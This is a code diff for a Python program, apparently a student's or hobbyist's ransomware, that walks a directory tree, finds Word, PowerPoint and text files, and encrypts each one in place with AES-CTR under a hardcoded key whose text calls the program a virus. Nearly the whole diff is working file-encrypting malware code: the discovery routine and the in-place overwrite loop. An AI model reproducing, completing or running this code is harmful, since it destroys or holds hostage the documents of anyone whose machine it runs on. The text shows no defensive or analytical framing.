@@ -4,8 +4,38 @@ from Crypto.Cipher import AES
 from Crypto.Util import Counter
 import argparse
 import os
-import Discovery
-import Crypter
+
+def change_files(filename, cryptoFn, block_size=16):
+
+    with open(filename, 'r+b') as _file:
+        raw_value = _file.read(block_size)
+        while raw_value:
+            cipher_value = cryptoFn(raw_value)
+            if len(raw_value) != len(cipher_value):
+                raise ValueError('O valor cifrado {} tem um tamanho diferente do valor plano {}'.format(len(cipher_value), len(raw_value)))
+
+            _file.seek(- len(raw_value), 1)
+            _file.write(cipher_value)
+            raw_value = _file.read(block_size)
+
+def discover(initial_path):
+    
+    extensions = [
+        'docx', 'doc', 'ppt', 'txt',
+    ]
+
+    for dirpath, dirs, files in os.walk(initial_path):
+        for _file in files:
+            absopath = os.path.abspath(os.path.join(dirpath, _file))
+            ext = absopath.split('.')[-1]
+            if ext in extensions:
+                yield absopath
+
+
+if __name__ == '__main__':
+    x = discover(os.getcwd())
+    for i in x:
+        print(i)
 
 HARDCODED_KEY = 'YAGHO VULGO O MELHOR VIRUS HAHAH'
 
@@ -38,12 +68,12 @@ def main():
     startDirs = [init_path]
 
     for currentDir in startDirs:
-        for filename in Discovery.discover(currentDir):
-            Crypter.change_files(filename, cryptFn)
+        for filename in discover(currentDir):
+            change_files(filename, cryptFn)
     
     #limpar chave da memoria
 
-    for _ in range(100):
+    for _ in range(10000):
         pass
 
     if not decrypt:
